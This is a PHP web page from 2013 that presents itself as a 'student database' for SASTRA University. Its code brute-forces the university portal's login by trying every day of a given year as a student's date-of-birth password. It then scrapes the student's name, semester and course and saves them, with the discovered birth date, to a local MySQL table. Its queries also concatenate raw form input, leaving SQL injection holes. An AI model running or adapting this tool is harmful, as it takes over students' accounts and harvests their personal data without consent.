<?php
/*
PHP Ver 5.3.2 with Zend 2.2
APPLICATION: Info Finder for SASTRA,API
CODER: Shenbaga Prasanna,S
B.Tech, IT.
SASTRA University.
Last Update: 29/6/2013
*/
?>
<html>
<head>
<link href="index.css" type="text/css" rel="stylesheet">
<title>SASTRA DATABASE</title>
</head>
<body>
<font color="#FFFFFF">
<h1 id="box"><b>SASTRA STUDENT DATABASE</b></h1></font>
<div id="bo">
<form method="post">
<div id="tab">
<table>
<tr>
<td>
Enter Register Number:</td><td><input type="text" size=9 name="reg" /></td></tr>
<tr><td>Enter Expected Year of Birth:</td><td><input type="text" size=4 name="yr" /></td></tr>
<tr><td><div id="sub">
<input type="submit" value="Get Me Details" id="btn"  />
</div></td></tr>
</table>
</div>
</form>
</div>
<div id="hphp">

<?php

/***** OUR GAME STARTS ******/
$f=0;

/* Function to login */
function login($i,$d,$m,$yr)
{
$j=$d.$m.$yr;
$ch=curl_init();
set_time_limit(0);
curl_setopt($ch,CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch,CURLOPT_URL,"http://webstream.sastra.edu/sastrapwi/usermanager/youLogin.jsp");
curl_setopt($ch,CURLOPT_POST,true);
curl_setopt($ch,CURLOPT_COOKIEFILE,'JSESSIONID');
curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
curl_setopt($ch,CURLOPT_POSTFIELDS,"txtRegNumber=iamalsouser&txtPwd=thanksandregards&txtSN={$i}&txtPD={$j}&txtPA=1");
$home = curl_exec($ch);
curl_close($ch);
if(strstr($home,'test'))
{
	$arr=explode('<li>',$home);
	$arr2=explode('</li>',$arr[4]);
	echo $arr[1]."<br/>";
	echo $arr[2]."<br/>";
	echo $arr2[0]."<br/>";
	$dbh=mysqli_connect("localhost","root","","sastra");
	$arr[1]=strip_tags($arr[1]);
	$arr2[0]=strip_tags($arr2[0]);
	$arr[2]=strip_tags($arr[2]);
	$qry="INSERT INTO students VALUES('$i','$arr[1]','$arr2[0]','$arr[2]','$yr-$m-$d')";
	mysqli_query($dbh,$qry);
 	return true;
}
else return false;
}

/* Function to initialize the check */
function check($reg,$yr){
	$f=0;
for($i=1;$i<=12;$i++)
{
	for($j=1;$j<=31;$j++)
	{
		if($i<10) $m='0'.$i;
		else $m=''.$i;
		if($j<10) $d='0'.$j;
		else $d=''.$j;
		if(login($reg,$d,$m,$yr))
		{
		echo "DOB is: {$d}-{$m}-{$yr}";
		$f=1;
		break;
		}
	}
	if($f==1)
	break;
}
if($f==0)
echo "Not this year.. try some other year..";
}

/* This is the Main Part */
/* Remember this number?? then say.. or else Check online and say..;) Dynamic Programming with database.. */
if(isset($_POST['reg']) && isset($_POST['yr']))
{
$reg=$_POST['reg'];
$con=mysqli_connect("localhost","root","","sastra");
$result=mysqli_query($con,"SELECT * FROM students WHERE number='$reg'");
$t=0;
while($i=mysqli_fetch_array($result)){
	echo "<table>";
	echo "<tr><td>Reg No: </td><td>".$i[0]."</td></tr>";
	echo "<tr><td>Name: </td><td>".$i[1]."</td></tr>";
	echo "<tr><td>Semester: </td><td>".$i[2]."</td></tr>";
	echo "<tr><td>Course: </td><td>".$i[3]."</td></tr>";
	echo "<tr><td>D.O.B: </td><td>".$i[4]."</td></tr>";
	$t++;
	echo "</table>";
	break;
}
$yr=$_POST['yr'];
if($t==0)
	check($reg,$yr);
}

/***** GAME-OVER *****/
?>
</div>
</body>
</html>
